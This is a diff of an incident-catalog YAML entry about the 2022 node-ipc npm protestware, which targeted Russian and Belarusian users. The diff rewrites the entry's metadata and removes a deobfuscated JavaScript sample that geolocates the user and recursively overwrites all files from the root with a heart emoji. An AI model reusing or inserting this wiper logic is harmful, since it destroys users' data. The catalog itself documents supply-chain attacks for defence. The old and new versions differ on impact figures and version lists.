@@ -1,69 +1,24 @@
 - name: node-ipc
-  title: node-ipc maintainer added protestware targeting Russia/Belarus.
-  start_date: 2022-03-07 # First commit with malicious intent
-  end_date: 2022-03-16 # Discovery/mitigation started
-  license: MIT
-  website: https://github.com/RIAEvangelist/node-ipc # Original repo
-  repo: https://github.com/RIAEvangelist/node-ipc
-  attribution_type: original maintainer
-  attribution: Brandon Nozaki Miller (RIAEvangelist)
+  title: node-ipc NPM package maintainer adds protestware malware
+  synopsis: The maintainer added malicious code targeting users with Russian or Belarusian IP addresses. The code attempted to recursively overwrite files with a heart emoji character, causing data destruction. This 'protestware' was embedded within the popular `node-ipc` library.
+  start_date: 2022-03-07 # Approximate date malicious code first introduced
+  end_date: 2022-03-16 # Date widely reported and action taken
+  attribution_type: Original maintainer
   component_type: Library
   lang: Javascript
-  cause: maintainer sabotage (protestware)
-  motive: political protest
-  attack_vector: malicious publish
-  transitive: false
-  insertion_phase: source # Code committed to repo first, then published
-  impact_type: data destruction / denial of service
-  impact_user_count: 10000 # Conservative estimate based on usage (e.g., via vue-cli)
+  cause: Maintainer sabotage
+  motive: Protest # Geopolitical protest
+  insertion_phase: source
+  impact_type: Data destruction, Vandalism
+  impact_user_count: 1000000 # Based on weekly downloads
   references:
-    - https://snyk.io/blog/peacenotwar-protestware-npm-node-ipc-package/
     - https://github.com/RIAEvangelist/node-ipc/issues/233
-    - https://nvd.nist.gov/vuln/detail/CVE-2022-23812
-    - https://en.wikipedia.org/wiki/Peacenotwar
-    - https://orca.security/resources/blog/cve-2022-23812-protestware-malicious-code-node-ipc-npm-package/
-  versions: # Destructive/disruptive versions
-    - "10.1.1"
-    - "10.1.2"
-    - "11.0.0" # Included peacenotwar dependency
-    - "11.1.0" # Included peacenotwar dependency
-  commits: # Commits adding protestware logic
-    - "5d77c4e0196279565007769295b5a867d116e659"
-    - "491426917c591754d1b0548e018a97e911e31039"
-  artifacts:
-    - "https://www.npmjs.com/package/node-ipc (malicious versions yanked)"
-    - "https://github.com/RIAEvangelist/node-ipc/blob/5d77c4e0196279565007769295b5a867d116e659/dao/ssl-comm.js"
-  synopsis: The maintainer of `node-ipc` added malicious "protestware" code targeting users with Russian or Belarusian IP addresses. This code attempted to overwrite files with heart symbols or create protest message files on users' desktops.
-  compromise_desc: The maintainer of the `node-ipc` npm package, Brandon Nozaki Miller (RIAEvangelist), added obfuscated code to the library, committed it to the source repository, and published new versions. This code checked the user's geolocation via an external IP lookup service. If the IP was geolocated to Russia or Belarus, early malicious versions (10.1.1, 10.1.2) attempted to overwrite arbitrary files by recursively traversing the filesystem and replacing file contents with a heart emoji ('❤️'). A later version replaced this destructive behavior by adding a dependency on another package (`peacenotwar`) which created a file named `WITH-LOVE-FROM-AMERICA.txt` on the user's desktop containing a peace message.
-  impact_desc: Users with IP addresses geolocated to Russia or Belarus who installed or ran applications using the malicious versions of `node-ipc` (10.1.1, 10.1.2) could experience widespread file corruption and data loss. Later versions (11.x) were less destructive but still performed undesirable actions by creating files on the user's system without consent. This affected dependent projects like `vue-cli`, causing disruption and requiring maintainers to pin dependencies to safe versions.
-  example_code: |
-    // Simplified, deobfuscated logic from node-ipc v10.1.1/v10.1.2
-    // Actual code used Base64 and hex encoding for obfuscation.
-
-    const https = require('https');
-    const fs = require('fs');
-    const path = require('path');
-
-    async function checkLocationAndAct() {
-      // Uses external service like api.ipgeolocation.io to get country code
-      const country = await getCountryCode(); // Placeholder for actual lookup
-
-      if (country === 'RU' || country === 'BY') {
-        wipeFiles('/');
-      }
-    }
-
-    function wipeFiles(currentPath) {
-      fs.readdir(currentPath, { withFileTypes: true }, (err, files) => {
-        if (err) return;
-        files.forEach(file => {
-          const filePath = path.join(currentPath, file.name);
-          fs.writeFile(filePath, '❤️', { flag: 'w' }, () => {}); // Overwrite with heart emoji
-          if (file.isDirectory()) {
-            wipeFiles(filePath); // Recurse into directories
-          }
-        });
-      });
-    }
-
-    checkLocationAndAct(); // Trigger the check
+    - https://snyk.io/blog/peacenotwar-protestware-node-ipc-package-vulnerability/
+    - https://www.bleepingcomputer.com/news/security/big-sabotage-nodejs-package-wipes-files-to-protest-ukraine-war/
+  versions:
+    - 9.2.2
+    - 10.1.1
+    - 10.1.2
+    - 11.0.0 # Specific versions containing the 'peacenotwar' module
+  commits:
+    - f3ff376905550597f05410771031cc67a446f662 # Example commit related to the module inclusion
